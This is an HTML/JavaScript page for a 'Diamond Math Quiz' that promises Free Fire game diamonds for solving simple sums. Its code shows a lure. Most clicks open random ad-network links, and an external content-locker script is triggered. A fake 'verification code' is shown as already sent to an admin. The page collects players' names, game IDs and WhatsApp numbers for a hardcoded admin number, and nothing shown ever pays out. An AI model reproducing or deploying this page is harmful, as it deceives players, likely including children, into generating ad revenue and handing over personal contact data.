<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Diamond Math Quiz - Smart System</title>

    <script src="https://pl28762541.effectivegatecpm.com/49/fe/bc/49febcbf5c03dbc1bd4f30769154431e.js"></script>

    <script type="text/javascript" src="https://ridefiles.net/script_include.php?id=1878026"></script>

    <style>
        body { font-family: 'Poppins', sans-serif; background-color: #0b101b; color: white; text-align: center; margin: 0; padding: 10px; }
        .container { max-width: 420px; margin: 20px auto; background: #1a202e; padding: 25px; border-radius: 20px; border: 2px solid #00d4ff; box-shadow: 0 0 15px rgba(0, 212, 255, 0.2); }
        .q-display { font-size: 45px; background: #0b101b; padding: 20px; border-radius: 15px; margin-bottom: 20px; border: 2px dashed #00d4ff; color: #00d4ff; text-shadow: 0 0 10px rgba(0,212,255,0.3); }
        input { width: 90%; padding: 15px; border-radius: 10px; margin-bottom: 15px; text-align: center; font-size: 16px; border: 1px solid #334155; background: #0f172a; color: white; outline: none; }
        input:focus { border-color: #00d4ff; }
        .btn { width: 100%; padding: 16px; margin: 10px 0; border-radius: 12px; border: none; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        .btn-blue { background: linear-gradient(90deg, #00d4ff, #0072ff); color: white; }
        .btn-green { background: #10b981; color: white; }
        .btn-orange { background: #f59e0b; color: white; }
        .hidden { display: none; }
        .v-box { background: #1e293b; padding: 15px; border-radius: 10px; margin: 10px 0; border: 2px solid #fbbf24; }
        .v-code { font-size: 28px; color: #fbbf24; font-weight: bold; letter-spacing: 5px; }
        #ad-status { font-size: 13px; margin-bottom: 10px; color: #f87171; }
    </style>
</head>
<body>

<div class="container">
    <h2>ðŸ’Ž Diamond Math Quiz</h2>

    <div id="login-step">
        <p>Enter your name to start earning</p>
        <input type="text" id="regName" placeholder="Your Name">
        <button class="btn btn-blue" onclick="doLogin()">Login & Start</button>
    </div>

    <div id="game-step" class="hidden">
        <div style="margin-bottom: 10px; font-weight: bold;">Coins: <span id="coinText" style="color:#00d4ff">0</span></div>
        <div id="ad-status">Solve the quiz to earn coins!</div>
        <div id="qBox" class="q-display"></div>
        <input type="number" id="userAns" placeholder="Answer">
        <button id="checkBtn" class="btn btn-green" onclick="checkAnswer()">Check Answer</button>
        <button class="btn btn-orange" onclick="goToWithdraw()">Withdraw Diamonds</button>
    </div>

    <div id="withdraw-step" class="hidden">
        <h3>ðŸ’° Withdrawal Form</h3>
        <input type="text" id="ffid" placeholder="Free Fire Player ID">
        <input type="tel" id="userWhatsApp" placeholder="WhatsApp Number (947...)">
        
        <button id="verifyBtn" class="btn btn-blue" onclick="sendVerifyCode()">Get Verification Code</button>
        
        <div id="code-area" class="hidden">
            <div class="v-box">
                <p style="margin:0; font-size:12px; color: #94a3b8;">Your Code (Already sent to Admin)</p>
                <div id="displayCode" class="v-code">----</div>
            </div>
            <p style="font-size:12px; margin-bottom:5px;">Type the code above to verify:</p>
            <input type="number" id="inputCode" placeholder="Enter Code">
            <button class="btn btn-blue" onclick="confirmCode()">Confirm & Verify</button>
        </div>

        <p id="vStatus" class="hidden" style="color:#10b981; font-weight: bold; margin: 10px;">âœ… Account Verified!</p>
        <button id="finalSubmit" class="btn btn-green hidden" onclick="finalSubmit()">Submit Request</button>
    </div>
</div>

<script>
    // --- Data Configuration ---
    const directLinks = [
        "https://www.effectivegatecpm.com/tv3xfsg5b?key=7385919c5e251f958807bf428e4ad0f2",
        "https://www.effectivegatecpm.com/nxb65rz1bt?key=d0d811b8ce76499f28dbb7d53dce334d",
        "https://www.effectivegatecpm.com/ibn3hw1ffd?key=4ff4d9abaaebe494f5fafe56fd05628f",
        "https://www.effectivegatecpm.com/am6ay8q1r?key=af909ab92962c149bd3203e11f1149d2",
        "https://www.effectivegatecpm.com/f545u74jr?key=c919d216d7b93a390c2c819f50e3493e"
    ];
    const adminWhatsApp = "94741580340";

    let coins = 0;
    let currentCorrect, generatedVCode;
    let isWaitingForAd = false;

    // Open random Adsterra Direct Link
    function triggerAd() {
        let link = directLinks[Math.floor(Math.random() * directLinks.length)];
        window.open(link, '_blank');
    }

    // 1. Login (CPAGrip Offerwall)
    function doLogin() {
        if(!document.getElementById('regName').value) return alert("Please enter your name!");
        call_locker(); 
        document.getElementById('login-step').classList.add('hidden');
        document.getElementById('game-step').classList.remove('hidden');
        nextQ();
    }

    function nextQ() {
        let a = Math.floor(Math.random() * 10) + 5;
        let b = Math.floor(Math.random() * 10) + 2;
        currentCorrect = a + b;
        document.getElementById('qBox').innerText = `${a} + ${b}`;
        document.getElementById('ad-status').innerText = "Click 'Check Answer' & View Ad to get Coins!";
        document.getElementById('ad-status').style.color = "#f87171";
    }

    // 2. Check Answer with Anti-Cheat
    function checkAnswer() {
        let ans = document.getElementById('userAns').value;
        if(ans == currentCorrect) {
            isWaitingForAd = true;
            document.getElementById('checkBtn').disabled = true;
            document.getElementById('ad-status').innerText = "Ad Opening... View it and return to get coins!";
            document.getElementById('ad-status').style.color = "#fbbf24";
            
            triggerAd();

            // Check if user left and returned
            let focusChecker = setInterval(() => {
                if (document.hasFocus() && isWaitingForAd) {
                    coins += 10;
                    document.getElementById('coinText').innerText = coins;
                    document.getElementById('ad-status').innerText = "âœ… Ad Verified! +10 Coins Added.";
                    document.getElementById('ad-status').style.color = "#10b981";
                    document.getElementById('checkBtn').disabled = false;
                    isWaitingForAd = false;
                    clearInterval(focusChecker);
                    setTimeout(nextQ, 2000);
                }
            }, 1000);
        } else {
            alert("Wrong Answer!");
            triggerAd();
        }
        document.getElementById('userAns').value = "";
    }

    // 3. Withdraw Page
    function goToWithdraw() {
        triggerAd();
        document.getElementById('game-step').classList.add('hidden');
        document.getElementById('withdraw-step').classList.remove('hidden');
    }

    // 4. Smart WhatsApp Verification
    function sendVerifyCode() {
        let name = document.getElementById('regName').value;
        let phone = document.getElementById('userWhatsApp').value;
        if(!phone) return alert("Enter your WhatsApp number!");

        generatedVCode = Math.floor(1000 + Math.random() * 9000);
        document.getElementById('displayCode').innerText = generatedVCode;
        
        triggerAd();
        // Send code to Admin WhatsApp
        window.open(`https://wa.me/${adminWhatsApp}?text=*Verification Request*%0AName: ${name}%0ACode: ${generatedVCode}`, '_blank');
        
        document.getElementById('verifyBtn').classList.add('hidden');
        document.getElementById('code-area').classList.remove('hidden');
    }

    function confirmCode() {
        if(document.getElementById('inputCode').value == generatedVCode) {
            document.getElementById('code-area').classList.add('hidden');
            document.getElementById('vStatus').classList.remove('hidden');
            document.getElementById('finalSubmit').classList.remove('hidden');
        } else {
            alert("Invalid Code! Please check the code shown above.");
        }
    }

    // 5. Final Submit (ID & Coins to WhatsApp)
    function finalSubmit() {
        call_locker();
        let name = document.getElementById('regName').value;
        let id = document.getElementById('ffid').value;
        let finalMsg = `*Withdrawal Request*%0AName: ${name}%0AID: ${id}%0ACoins: ${coins}%0AStatus: Verified âœ…`;
        
        setTimeout(() => {
            window.open(`https://wa.me/${adminWhatsApp}?text=${finalMsg}`, '_blank');
        }, 3000);
    }
</script>

</body>
</html>
